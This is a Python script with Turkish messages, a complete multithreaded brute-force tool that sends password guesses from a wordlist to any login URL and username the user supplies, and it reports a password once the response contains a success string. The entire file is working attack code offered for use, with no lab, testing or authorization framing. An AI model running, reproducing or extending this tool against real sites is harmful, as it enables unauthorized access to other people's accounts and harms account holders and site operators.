import requests
from concurrent.futures import ThreadPoolExecutor
import time
import sys
from typing import Optional
import logging
from requests.exceptions import RequestException

class BruteForceHandler:
    def __init__(self, url: str, username: str, password_list: str, max_workers: int = 5):
        self.url = url
        self.username = username
        self.password_list = password_list
        self.max_workers = max_workers
        self.session = requests.Session()
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

    def try_password(self, password: str) -> Optional[str]:
        try:
            self.attempts += 1
            password = password.strip()
            
            self.logger.debug(f"Deneniyor: {password}")
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
            }
            
            response = self.session.post(
                self.url,
                data={'username': self.username, 'password': password},
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200 and "Başarılı" in response.text:
                self.found_password = password
                self.logger.info(f"Şifre bulundu: {password}")
                return password
                
        except RequestException as e:
            self.logger.error(f"Bağlantı hatası: {str(e)}")
        except Exception as e:
            self.logger.error(f"Beklenmeyen hata: {str(e)}")
        
        return None

    def load_passwords(self) -> list:
        try:
            with open(self.password_list, 'r', encoding='utf-8') as file:
                return [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            self.logger.error(f"Şifre listesi bulunamadı: {self.password_list}")
            sys.exit(1)
        except Exception as e:
            self.logger.error(f"Dosya okuma hatası: {str(e)}")
            sys.exit(1)

    def run(self) -> Optional[str]:
        self.start_time = time.time()
        passwords = self.load_passwords()
        
        self.logger.info(f"Toplam {len(passwords)} şifre test edilecek")
        self.logger.info("Brute force işlemi başlatılıyor...")

        try:
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                executor.map(self.try_password, passwords)
                
        except KeyboardInterrupt:
            self.logger.warning("\nİşlem kullanıcı tarafından durduruldu!")
        finally:
            duration = time.time() - self.start_time
            self.logger.info(f"Toplam deneme: {self.attempts}")
            self.logger.info(f"Geçen süre: {duration:.2f} saniye")
            self.logger.info(f"Hız: {self.attempts/duration:.2f} deneme/saniye")
        
        return self.found_password

def get_user_input() -> tuple:
    """Kullanıcıdan gerekli bilgileri alır"""
    print("\n=== Brute Force Aracı ===")
    print("------------------------")
    
    while True:
        url = input("\nHedef site URL'si (örn: https://example.com/login): ").strip()
        if url:
            if not url.startswith(('http://', 'https://')):
                url = f'https://{url}'
            break
        print("Hata: URL boş olamaz!")

    while True:
        username = input("\nKullanıcı adı: ").strip()
        if username:
            break
        print("Hata: Kullanıcı adı boş olamaz!")

    while True:
        password_list = input("\nŞifre listesi dosyasının yolu: ").strip()
        if password_list:
            # Dosyanın varlığını kontrol et
            try:
                with open(password_list, 'r', encoding='utf-8') as f:
                    if sum(1 for _ in f) > 0:
                        break
                    print("Hata: Şifre listesi boş!")
            except FileNotFoundError:
                print("Hata: Dosya bulunamadı!")
            except Exception as e:
                print(f"Hata: Dosya okuma hatası - {str(e)}")
        print("Geçerli bir şifre listesi dosyası belirtin!")

    return url, username, password_list

def main():
    try:
        print("\n=== Brute Force Aracı v2.0 ===")
        print("Çıkmak için herhangi bir aşamada Ctrl+C'ye basın")
        print("-----------------------------------")

        url, username, password_list = get_user_input()
        
        print("\nGirilen bilgiler:")
        print(f"URL: {url}")
        print(f"Kullanıcı adı: {username}")
        print(f"Şifre listesi: {password_list}")
        
        onay = input("\nDevam etmek istiyor musunuz? (e/h): ").strip().lower()
        if onay != 'e':
            print("\nİşlem iptal edildi.")
            return

        brute_forcer = BruteForceHandler(url, username, password_list)
        result = brute_forcer.run()
        
        if result:
            print(f"\n[+] Şifre başarıyla bulundu: {result}")
        else:
            print("\n[-] Şifre bulunamadı!")
            
    except KeyboardInterrupt:
        print("\n\nProgram kullanıcı tarafından sonlandırıldı...")
    except Exception as e:
        print(f"\nBeklenmeyen hata: {str(e)}")
    finally:
        print("\nProgram sonlandırıldı.")

if __name__ == "__main__":
    main()